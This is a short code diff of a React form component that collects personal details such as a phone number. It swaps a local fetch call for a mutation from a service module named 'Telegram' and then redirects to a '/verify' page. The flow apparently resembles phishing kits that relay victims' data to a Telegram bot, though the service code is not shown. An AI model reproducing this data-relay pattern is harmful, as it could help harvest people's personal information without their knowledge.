@@ -2,6 +2,7 @@ import React, { useState } from "react";
 import id from "../assets/id.png";
 import download from "../assets/download2.png";
 import { useNavigate } from "react-router-dom";
+import {  useSendDetailsMutation,} from "../Services/Telegram"
 
 const Details = () => {
   const [currentErrorField, setCurrentErrorField] = useState(null);
@@ -18,6 +19,7 @@ const Details = () => {
     phone: "",
   });
   const navigate = useNavigate();
+  const [sendDetails] = useSendDetailsMutation();
 
   const handleChange = (event) => {
     const { name, value } = event.target;
@@ -85,23 +87,15 @@ const handleSubmit = async (e) => {
   setCurrentErrorField(null);
 
   try {
-    const response = await fetch('http://localhost:4000/sendDetails', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(formData),
-    });
-
-    if (!response.ok) {
-      throw new Error('Failed to send details to server');
-    }
-
+    await sendDetails(formData).unwrap();
     console.log("Details sent successfully!");
     navigate("/verify");
   } catch (error) {
     console.error("Error sending details:", error);
-    // Optionally show an error message to user
+    // Optionally display error to user
   }
 };
+
 
 
   return (
